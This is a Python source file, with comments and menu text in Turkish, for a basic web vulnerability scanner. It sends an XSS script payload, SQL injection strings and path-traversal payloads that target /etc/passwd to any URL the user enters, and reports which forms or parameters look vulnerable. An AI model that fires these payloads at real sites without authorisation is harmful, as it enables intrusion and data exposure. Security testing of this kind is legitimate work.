import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime

# === LOGGING ===
def log_result(text):
    with open("scan_results.txt", "a", encoding="utf-8") as f:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        f.write(f"{timestamp} {text}\n")
    print(text)

# === GLOBAL PAYLOADLAR VE HATALAR ===
XSS_PAYLOAD = "<script>alert('XSS')</script>"

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "';--",
    "\" OR \"\"=\"",
    "' OR 'a'='a"
]

SQLI_ERRORS = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "/etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd"
]

# === ORTAK YARDIMCI ===
def get_all_forms(url):
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        if name:
            details["inputs"].append({"type": input_type, "name": name})
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] in ["text", "search"]:
            data[input["name"]] = payload
        else:
            data[input["name"]] = "test"
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

# === XSS TARAMASI ===
def scan_xss(url):
    log_result("\n== XSS Taraması ==")
    forms = get_all_forms(url)
    for i, form in enumerate(forms):
        form_details = get_form_details(form)
        res = submit_form(form_details, url, XSS_PAYLOAD)
        if XSS_PAYLOAD in res.text:
            log_result(f"[!!!] XSS Açığı Bulundu! -> Form #{i+1}")
        else:
            log_result(f"[-] Form #{i+1} güvenli gibi görünüyor.")

# === SQLi TARAMASI ===
def is_sqli_vulnerable(response):
    for error in SQLI_ERRORS:
        if error.lower() in response.text.lower():
            return True
    return False

def test_url_params_sqli(url):
    log_result("\n== SQLi (GET) Taraması ==")
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    for param in qs:
        for payload in SQLI_PAYLOADS:
            test_params = qs.copy()
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?" + "&".join([f"{k}={v}" for k, v in test_params.items()])
            res = requests.get(test_url)
            if is_sqli_vulnerable(res):
                log_result(f"[!!!] SQL Injection bulundu! Parametre: {param}")
                break

def scan_sql_injection(url):
    test_url_params_sqli(url)
    log_result("\n== SQLi (Form) Taraması ==")
    forms = get_all_forms(url)
    for i, form in enumerate(forms):
        form_details = get_form_details(form)
        for payload in SQLI_PAYLOADS:
            res = submit_form(form_details, url, payload)
            if is_sqli_vulnerable(res):
                log_result(f"[!!!] SQLi Açığı Bulundu! -> Form #{i+1}")
                break

# === LFI TARAMASI ===
def detect_lfi(content):
    return "root:x:0:0" in content or "nologin" in content

def scan_lfi(url):
    log_result("\n== LFI Taraması ==")
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    for param in qs:
        for payload in LFI_PAYLOADS:
            modified_params = qs.copy()
            modified_params[param] = payload
            new_query = "&".join([f"{k}={v}" for k, v in modified_params.items()])
            full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            try:
                res = requests.get(full_url)
                if detect_lfi(res.text):
                    log_result(f"[!!!] LFI Açığı Bulundu! Parametre: {param}")
                    break
            except Exception as e:
                log_result(f"[!] Hata: {e}")

# === ANA MENÜ ===
def main():
    with open("scan_results.txt", "w") as f:
        f.write("=== Güvenlik Tarama Raporu ===\n")

    print("== Basit Güvenlik Açığı Tarayıcı ==")
    url = input("Hedef URL'yi girin: ")

    while True:
        print("\n--- Menü ---")
        print("1. XSS Tarama")
        print("2. SQL Injection Tarama")
        print("3. LFI Tarama")
        print("0. Çıkış")

        choice = input("Seçim: ")

        if choice == "1":
            scan_xss(url)
        elif choice == "2":
            scan_sql_injection(url)
        elif choice == "3":
            scan_lfi(url)
        elif choice == "0":
            print("Çıkılıyor...")
            break
        else:
            print("Geçersiz seçim.")

if __name__ == "__main__":
    main()
